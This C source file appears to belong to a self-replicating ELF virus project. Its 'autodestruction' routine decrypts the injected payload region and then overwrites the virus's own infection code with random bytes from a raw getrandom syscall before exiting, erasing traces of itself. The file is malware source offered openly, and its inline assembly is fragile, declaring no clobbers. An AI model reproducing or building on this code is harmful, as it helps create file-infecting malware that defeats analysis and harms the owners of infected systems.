#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// ASM VOLATILE 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline ssize_t _getrandom(void *buf, size_t buflen, unsigned int flags)
{
	ssize_t ret;

	__asm__ volatile (
			"mov rdi, %0\n"
			"mov rsi, %1\n"
			"mov edx, %2\n"

			"mov rax, 0x13e\n"
			"syscall\n"
			:
			: "g"(buf), "g"(buflen), "g"(flags)
			);
	__asm__ (
			"mov %0, rax\n"
			: "=r"(ret)
			:
		);

	return ret;
}

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION 
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void _bzero(char *str, const size_t size)
{
	if (str == NULL)
		return ;

	for (register size_t index = 0; index < size; index++)
		str[index] = 0;
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void autodestruction(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	decrypt_left(keychain, (char *)injection, (void *)autodestruction - (void *)injection);

	printf("%s\t\t%s\n", __PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
	
	char *entry;
	const size_t size = (void *)autodestruction - (void *)find_host;
	char buf[size];

	entry = (char *)find_host;

	if (_getrandom(buf, size, GRND_NONBLOCK) < 0)
		_bzero(buf, size);

	for (register size_t index = 0; index < size; index++)
		entry[index] = buf[index];

	__exit(host->stack);
}
